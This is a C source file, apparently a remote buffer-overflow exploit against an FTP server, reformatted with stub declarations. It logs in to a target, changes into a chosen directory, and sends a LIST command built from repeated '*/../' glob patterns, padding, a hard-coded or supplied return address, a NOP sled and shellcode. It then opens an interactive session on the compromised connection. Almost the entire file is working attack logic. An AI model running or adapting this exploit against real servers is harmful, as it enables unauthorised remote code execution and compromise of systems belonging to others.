#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int /*<<< orphan*/  sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct in_addr {int dummy; } ;
struct hostent {int /*<<< orphan*/ * h_addr_list; } ;
typedef  int /*<<< orphan*/  commandbuf ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char* PASS ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 char* USER ; 
 int atoi (char*) ; 
 int cflag ; 
 int /*<<< orphan*/  communicate (int) ; 
 int connect (int,struct sockaddr*,int) ; 
 scalar_t__ debug ; 
 int /*<<< orphan*/  docmd (int,char*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fflush (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fgets (char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* gethostbyname (char*) ; 
 char getopt (int,char**,char*) ; 
 int /*<<< orphan*/  herror (char*) ; 
 int /*<<< orphan*/  htons (int) ; 
 int lflag ; 
 int /*<<< orphan*/  memcpy (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  memset (struct sockaddr_in*,int /*<<< orphan*/ ,int) ; 
 char* optarg ; 
 int optind ; 
 int /*<<< orphan*/  perror (char*) ; 
 int sflag ; 
 char* shellcode ; 
 int /*<<< orphan*/  snprintf (char*,int,char*,char*) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdin ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncat (char*,char*,int) ; 
 long strtoul (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc, char *argv[])
{
  char expbuf[512] = "LIST ", *basedir, option;
  char commandbuf[512] = "", *hostname;
  int cnt, dirlen, explen, sendlen;
  int s, port = 21, pad;
  long retaddr;
  struct sockaddr_in sin;
  struct hostent *he;

  while((option = getopt(argc, argv, "dc:l:p:s:")) != -1)
    switch(option)
      {
      case 'd':
        debug++;
        break;
      case 'c':
        cflag = 1;
        basedir = optarg;
        break;
      case 'l':
        lflag = 1;
        dirlen = atoi(optarg);
        if(dirlen < 16)
          {
            usage(argv[0]);
            exit(0);
          }
        break;
      case 'p':
        port = atoi(optarg);
        break;
      case 's':
        sflag = 1;
        retaddr = strtoul(optarg, 0, 0);
        break;
      default:
        usage(argv[0]);
        exit(0);
      }

  if(!cflag || !lflag)
    {
      usage(argv[0]);
      exit(0);
    }

  if(argc - optind == 1)
    hostname = argv[optind];
  else
    {
      usage(argv[0]);
      exit(0);
    }

  if((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror("socket");
      exit(1);
    }

  if((he = gethostbyname(hostname)) == NULL)
    {
      herror(hostname);
      exit(0);
    }
  memset(&sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  memcpy(&sin.sin_addr, he->h_addr_list[0], sizeof(struct in_addr));
  if(connect(s, (struct sockaddr *) &sin, sizeof(struct sockaddr_in)) == -1)
    {
      perror("connect");
      exit(0);
    }

  if(debug)
    fprintf(stderr, "// basedir = \"%s\"\n", basedir);

  /* "untrusted input"? */
  for(cnt = 0; cnt < 1024/(dirlen+4)-1; cnt++)
    strcat(expbuf, "*/../");
  strcat(expbuf, "*/");
  if(debug)
    fprintf(stderr, "// expbuf = \"%s\"\n", expbuf);

  explen = cnt*(dirlen+4) + dirlen + 1;
  if(debug)
    fprintf(stderr, "// explen = %d\n", explen);

  sendlen = strlen(expbuf);
  if(debug)
    fprintf(stderr, "// sendlen = %d\n", sendlen);

  docmd(s, "", 0);

  docmd(s, USER, 0);
  docmd(s, PASS, 1);

  snprintf(commandbuf, sizeof(commandbuf), "CWD %s\r\n", basedir);
  docmd(s, commandbuf, 1);


/*************************/

  pad = 1027 - explen;
  if(debug)
    fprintf(stderr, "// pad = %d\n", pad);

  for(; pad >= 0; pad--)
    strcat(expbuf, "x");

  /* return address */
  if(!sflag)
    {
      switch(dirlen)
        {
        case 16:
          retaddr = 0xdfbeab60;
        case 26:
          retaddr = 0xdfbefe40;
        default:
          /* I don't have the patience to investigate this. */
          retaddr = 0xdfbeba20 + (dirlen-17)*0x9c0;
        }
      retaddr+=20;
    }

  fprintf(stderr, "retaddr = %.8lx\n", retaddr);
  /* endian dependant */
  strncat(expbuf, (char *) &retaddr, 4);

  for(cnt = strlen(expbuf); cnt < 508-strlen(shellcode); cnt++)
    strcat(expbuf, "\x90");

  strcat(expbuf, shellcode);

  strcat(expbuf, "\r\n");
/*************************/

  fprintf(stderr, "Press enter.."); fflush(stderr);
  fgets(commandbuf, sizeof(commandbuf)-1, stdin);

  docmd(s, expbuf, 0);

  fprintf(stderr, "remember to remove the \"adfa\"-dir\n");
  communicate(s);

  return 0;
}